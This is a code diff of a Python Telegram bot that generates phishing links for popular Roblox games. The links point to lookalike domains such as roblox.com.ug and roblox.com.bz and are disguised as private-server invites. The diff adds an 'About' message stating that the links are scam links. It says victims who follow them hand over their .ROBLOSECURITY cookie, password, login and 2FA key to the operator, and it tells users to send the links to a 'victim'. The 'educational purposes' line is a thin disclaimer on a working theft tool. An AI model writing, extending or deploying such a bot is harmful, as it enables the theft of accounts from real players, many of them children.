@@ -25,7 +25,6 @@ def save_json(file, data):
     with open(file, "w") as f:
         json.dump(data, f)
 
-# Загружаем список пользователей
 if os.path.exists(USERS_FILE):
     with open(USERS_FILE, "r") as f:
         USERS = json.load(f)
@@ -38,60 +37,79 @@ def save_user(user_id):
         with open(USERS_FILE, "w") as f:
             json.dump(USERS, f)
 
-# Загружаем языки
 user_lang = load_json(LANG_FILE)
+
 def save_lang():
     save_json(LANG_FILE, user_lang)
 
-# Глобальная переменная для ответов админа
 pending_reply = {}
 
 # === ТЕКСТЫ ===
 TEXTS = {
     "ru": {
-        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Выберите игру и получите готовую ссылку.\n▸ Нажмите на кнопку ниже.",
-        "choose_action": "📌 *Выберите игру:*",
+        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Выбери игру и получи готовую ссылку.\n▸ Нажми на кнопку ниже.",
+        "choose_action": "📌 *Выбери действие:*",
         "game_list": (
             "🎮 *Доступные игры:*\n"
             "─────────────────\n"
-            "▸ Adopt Me\n"
-            "▸ Murder Mystery 2\n"
-            "▸ Blox Fruits\n"
-            "▸ Brookhaven RP\n"
-            "▸ Pet Simulator 99\n"
-            "▸ Toilet Tower Defense\n"
-            "▸ RIVALS\n"
-            "▸ Grow a Garden 2\n"
-            "▸ Steal a Brainrot\n"
+            "▸ Adopt Me\n▸ Murder Mystery 2\n▸ Blox Fruits\n"
+            "▸ Brookhaven RP\n▸ Pet Simulator 99\n▸ Toilet Tower Defense\n"
+            "▸ RIVALS\n▸ Grow a Garden 2\n▸ Steal a Brainrot\n"
             "▸ +1 Speed Keyboard Escape"
         ),
-        "link_sent": "🔗 *Ссылка для {}:*\n\n{}\n\n📌 *Отправьте её жертве.*",
-        "support": "✍️ *Напишите ваш запрос. Администратор ответит в ближайшее время.*",
-        "choose_lang": "🌐 *Выберите язык:*",
+        "link_sent": "🔗 *Ссылка для {}:*\n\n{}\n\n📌 *Отправь её жертве.*",
+        "about": (
+            "ℹ️ *О боте*\n\n"
+            "🔹 *Что делает этот бот?*\n"
+            "▸ Генерирует готовые скам-ссылки для популярных игр Roblox.\n\n"
+            "🔹 *Как это работает?*\n"
+            "▸ Жертва переходит по твоей ссылке и вводит свои данные.\n"
+            "▸ Всё, что она ввела — *приходит тебе сюда*.\n\n"
+            "🔹 *Какие данные приходят?*\n"
+            "▸ 🍪 .ROBLOSECURITY (куки)\n"
+            "▸ 👤 Логин / никнейм\n"
+            "▸ 🔑 Пароль\n"
+            "▸ 🔐 Ключ аутентификатора (2FA)\n\n"
+            "🔹 *Важно:*\n"
+            "▸ Используй только в образовательных целях.\n"
+            "▸ Ответственность за использование лежит на тебе."
+        ),
+        "support": "✍️ *Напиши свой запрос. Администратор ответит в ближайшее время.*",
+        "choose_lang": "🌐 *Выбери язык:*",
         "lang_changed": "✅ *Язык изменён.*",
         "reply_sent": "✅ *Ответ отправлен*",
         "admin_reply": "📨 *Ответ администратора:*\n",
         "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*",
-        "unknown_game": "⚠️ *Игра не найдена. Выберите из списка.*"
+        "unknown_game": "⚠️ *Игра не найдена. Выбери из списка.*"
     },
     "en": {
         "welcome": "🔓 *LINK GENERATOR*\n\n▸ Choose a game and get a ready link.\n▸ Press the button below.",
-        "choose_action": "📌 *Choose a game:*",
+        "choose_action": "📌 *Choose an action:*",
         "game_list": (
             "🎮 *Available games:*\n"
             "─────────────────\n"
-            "▸ Adopt Me\n"
-            "▸ Murder Mystery 2\n"
-            "▸ Blox Fruits\n"
-            "▸ Brookhaven RP\n"
-            "▸ Pet Simulator 99\n"
-            "▸ Toilet Tower Defense\n"
-            "▸ RIVALS\n"
-            "▸ Grow a Garden 2\n"
-            "▸ Steal a Brainrot\n"
+            "▸ Adopt Me\n▸ Murder Mystery 2\n▸ Blox Fruits\n"
+            "▸ Brookhaven RP\n▸ Pet Simulator 99\n▸ Toilet Tower Defense\n"
+            "▸ RIVALS\n▸ Grow a Garden 2\n▸ Steal a Brainrot\n"
             "▸ +1 Speed Keyboard Escape"
         ),
         "link_sent": "🔗 *Link for {}:*\n\n{}\n\n📌 *Send it to the victim.*",
+        "about": (
+            "ℹ️ *About the bot*\n\n"
+            "🔹 *What does this bot do?*\n"
+            "▸ Generates ready-made scam links for popular Roblox games.\n\n"
+            "🔹 *How does it work?*\n"
+            "▸ The victim clicks your link and enters their data.\n"
+            "▸ Everything they enter — *comes to you here*.\n\n"
+            "🔹 *What data comes?*\n"
+            "▸ 🍪 .ROBLOSECURITY (cookie)\n"
+            "▸ 👤 Login / username\n"
+            "▸ 🔑 Password\n"
+            "▸ 🔐 2FA key (authenticator)\n\n"
+            "🔹 *Important:*\n"
+            "▸ Use only for educational purposes.\n"
+            "▸ Responsibility for use lies with you."
+        ),
         "support": "✍️ *Write your request. Admin will reply soon.*",
         "choose_lang": "🌐 *Choose language:*",
         "lang_changed": "✅ *Language changed.*",
@@ -104,16 +122,16 @@ TEXTS = {
 
 # === ССЫЛКИ ПО ИГРАМ ===
 GAME_LINKS = {
-    "adopt me": "https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713",
-    "murder mystery 2": "https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713",
-    "blox fruits": "https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713",
-    "brookhaven rp": "https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713",
-    "pet simulator 99": "https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713",
-    "toilet tower defense": "https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713",
-    "rivals": "https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713",
-    "grow a garden 2": "https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713",
-    "steal a brainrot": "https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713",
-    "+1 speed keyboard escape": "https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713"
+    "adopt me": "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=82337251021839787402749538321389",
+    "murder mystery 2": "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=82337251021839787402749538321389",
+    "blox fruits": "https://roblox.com.bz/games/2753915549/Blox-Fruits?privateServerLinkCode=82337251021839787402749538321389",
+    "brookhaven rp": "https://roblox.com.bz/games/4924922222/Brookhaven-RP?privateServerLinkCode=82337251021839787402749538321389",
+    "pet simulator 99": "https://roblox.com.bz/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=82337251021839787402749538321389",
+    "toilet tower defense": "https://roblox.com.bz/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=82337251021839787402749538321389",
+    "rivals": "https://roblox.com.bz/games/17625359962/RIVALS?privateServerLinkCode=82337251021839787402749538321389",
+    "grow a garden 2": "https://roblox.com.bz/games/126884695634066/Grow-a-Garden?privateServerLinkCode=82337251021839787402749538321389",
+    "steal a brainrot": "https://roblox.com.bz/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=82337251021839787402749538321389",
+    "+1 speed keyboard escape": "https://roblox.com.bz/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=82337251021839787402749538321389"
 }
 
 # === КЛАВИАТУРЫ ===
@@ -127,7 +145,8 @@ LANG_KEYBOARD = {
 
 MAIN_KEYBOARD_RU = {
     "keyboard": [
-        ["🔗 Создать ссылку"]
+        ["🔗 Создать ссылку", "ℹ️ О боте"],
+        ["🌐 Сменить язык"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
@@ -135,7 +154,8 @@ MAIN_KEYBOARD_RU = {
 
 MAIN_KEYBOARD_EN = {
     "keyboard": [
-        ["🔗 Generate link"]
+        ["🔗 Generate link", "ℹ️ About"],
+        ["🌐 Change language"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
@@ -433,6 +453,17 @@ def webhook():
                 }
             )
 
+        elif text in ["ℹ️ О боте", "ℹ️ About"]:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                json={
+                    "chat_id": chat_id,
+                    "text": t["about"],
+                    "parse_mode": "Markdown",
+                    "reply_markup": keyboard
+                }
+            )
+
         elif text in ["🔙 Назад", "🔙 Back"]:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
@@ -447,7 +478,6 @@ def webhook():
         elif text.lower() in GAME_LINKS:
             game_name = text.lower()
             link = GAME_LINKS[game_name]
-            # Красивое название для вывода
             display_name = text.title() if lang == "en" else text
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
